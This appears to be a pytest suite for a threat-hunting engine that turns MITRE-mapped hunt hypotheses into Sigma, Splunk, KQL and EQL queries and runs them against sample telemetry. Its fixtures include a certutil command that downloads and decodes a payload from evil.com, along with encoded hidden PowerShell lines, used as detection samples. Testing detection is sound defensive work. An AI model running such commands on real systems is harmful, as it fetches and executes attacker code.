"""
CyberShield Enterprise - Threat Hunting Hypothesis Matrix Test Suite
Tests hypothesis modeling, multi-engine query transpilation (CS-QL, Sigma, SPL, KQL, EQL),
telemetry hunt execution, baseline anomaly scoring, and REST endpoints.
"""

import yaml
import pytest
from starlette.testclient import TestClient

from cybershield.api.server import app
from cybershield.threathunt.schemas import (
    TargetQueryEngine,
    HuntConfidence,
    HuntingHypothesis,
    HuntCondition,
)
from cybershield.threathunt.transpiler import ThreatHuntEngine


@pytest.fixture
def engine():
    return ThreatHuntEngine()


@pytest.fixture
def client():
    return TestClient(app)


# ------------------------------------------------------------------------------
# 1. Hypothesis Modeling & Catalog Tests
# ------------------------------------------------------------------------------

def test_hypothesis_catalog(engine):
    hypotheses = engine.hypotheses
    assert len(hypotheses) >= 4
    assert "HUNT-LOLBINS-01" in hypotheses
    assert "HUNT-LATERAL-WMI-02" in hypotheses

    lolbin_hyp = hypotheses["HUNT-LOLBINS-01"]
    assert lolbin_hyp.mitre_technique_id == "T1059.001"
    assert lolbin_hyp.mitre_tactic == "Execution"
    assert len(lolbin_hyp.conditions) >= 2


# ------------------------------------------------------------------------------
# 2. Multi-Engine Query Transpilation Tests
# ------------------------------------------------------------------------------

def test_transpile_to_csql(engine):
    hyp = engine.hypotheses["HUNT-LOLBINS-01"]
    csql = engine.transpile_to_csql(hyp)
    assert csql.startswith("FROM endpoint_events WHERE")
    assert "process_name IN ('certutil.exe'" in csql
    assert "command_line CONTAINS '-enc'" in csql


def test_transpile_to_sigma_yaml(engine):
    hyp = engine.hypotheses["HUNT-LOLBINS-01"]
    sigma_yaml = engine.transpile_to_sigma(hyp)
    parsed = yaml.safe_load(sigma_yaml)
    assert parsed["title"] == hyp.title
    assert parsed["logsource"]["category"] == "process_creation"
    assert "detection" in parsed
    assert "condition" in parsed["detection"]


def test_transpile_to_splunk_spl(engine):
    hyp = engine.hypotheses["HUNT-LOLBINS-01"]
    spl = engine.transpile_to_splunk(hyp)
    assert spl.startswith("index=endpoint")
    assert 'process_name IN ("certutil.exe"' in spl
    assert 'command_line="*-enc*"' in spl
    assert "| stats count by host" in spl


def test_transpile_to_microsoft_kql(engine):
    hyp = engine.hypotheses["HUNT-LOLBINS-01"]
    kql = engine.transpile_to_kql(hyp)
    assert "DeviceProcessEvents" in kql
    assert "FileName in~" in kql
    assert "ProcessCommandLine has_any" in kql


def test_transpile_to_elastic_eql(engine):
    hyp = engine.hypotheses["HUNT-LOLBINS-01"]
    eql = engine.transpile_to_eql(hyp)
    assert eql.startswith("process where")
    assert 'process.process_name in ("certutil.exe"' in eql


def test_transpile_bundle_all_dialects(engine):
    hyp = engine.hypotheses["HUNT-LATERAL-WMI-02"]
    bundle = engine.transpile_bundle(hyp)
    assert bundle.hypothesis_id == "HUNT-LATERAL-WMI-02"
    queries = bundle.transpiled_queries
    assert TargetQueryEngine.CS_QL in queries
    assert TargetQueryEngine.SIGMA in queries
    assert TargetQueryEngine.SPLUNK_SPL in queries
    assert TargetQueryEngine.MICROSOFT_KQL in queries
    assert TargetQueryEngine.ELASTIC_EQL in queries


# ------------------------------------------------------------------------------
# 3. Telemetry Hunt Execution & Anomaly Scoring Tests
# ------------------------------------------------------------------------------

def test_execute_hunt_with_threat_match(engine):
    telemetry = [
        {
            "host": "FINANCE-PC-04",
            "user": "jdoe",
            "pid": 4812,
            "process_name": "certutil.exe",
            "command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.bin -decode",
        },
        {
            "host": "DC01",
            "user": "SYSTEM",
            "pid": 1120,
            "process_name": "svchost.exe",
            "command_line": "svchost.exe -k netsvcs",
        }
    ]

    findings = engine.execute_hunt("HUNT-LOLBINS-01", telemetry)
    assert len(findings) == 1
    f = findings[0]
    assert f.entity_name == "FINANCE-PC-04"
    assert f.rarity_score >= 0.90
    assert f.confidence == HuntConfidence.CONFIRMED
    assert f.mitre_technique_id == "T1059.001"
    assert "FINANCE-PC-04" in f.recommended_action


def test_execute_hunt_clean_telemetry(engine):
    telemetry = [
        {"process_name": "notepad.exe", "command_line": "notepad.exe document.txt"}
    ]
    findings = engine.execute_hunt("HUNT-LOLBINS-01", telemetry)
    assert len(findings) == 0


def test_run_hunt_campaign(engine):
    telemetry = [
        {
            "host": "ENG-SRV-01",
            "parent_process": "wmiprvse.exe",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -enc SQBFAFgA...",
        }
    ]
    report = engine.run_hunt_campaign(telemetry)
    assert report.hypotheses_evaluated >= 4
    assert report.queries_transpiled >= 20
    assert report.total_findings >= 1
    assert report.coverage_score > 0.0


# ------------------------------------------------------------------------------
# 4. REST API Endpoints Tests
# ------------------------------------------------------------------------------

def test_api_list_hypotheses(client):
    response = client.get("/api/v1/threathunt/hypotheses")
    assert response.status_code == 200
    data = response.json()
    assert len(data) >= 4
    ids = [h["hypothesis_id"] for h in data]
    assert "HUNT-LOLBINS-01" in ids


def test_api_get_hypothesis(client):
    response = client.get("/api/v1/threathunt/hypothesis/HUNT-LOLBINS-01")
    assert response.status_code == 200
    data = response.json()
    assert data["hypothesis_id"] == "HUNT-LOLBINS-01"
    assert data["mitre_tactic"] == "Execution"


def test_api_transpile_hypothesis(client):
    response = client.post("/api/v1/threathunt/transpile/HUNT-LOLBINS-01")
    assert response.status_code == 200
    data = response.json()
    queries = data["transpiled_queries"]
    assert "cs_ql" in queries
    assert "sigma" in queries
    assert "splunk_spl" in queries


def test_api_execute_hunt(client):
    telemetry = [
        {
            "host": "HR-DESKTOP",
            "process_name": "powershell.exe",
            "command_line": "powershell.exe -w hidden -enc JABz...",
        }
    ]
    response = client.post("/api/v1/threathunt/execute/HUNT-LOLBINS-01", json=telemetry)
    assert response.status_code == 200
    data = response.json()
    assert len(data) == 1
    assert data[0]["entity_name"] == "HR-DESKTOP"


def test_api_stats_summary_and_health(client):
    stats = client.get("/api/v1/threathunt/stats/summary")
    assert stats.status_code == 200
    assert stats.json()["status"] == "active"
    assert "sigma" in stats.json()["supported_engines"]

    health = client.get("/api/v1/threathunt/health")
    assert health.status_code == 200
    assert health.json()["service"] == "threathunt-engine"
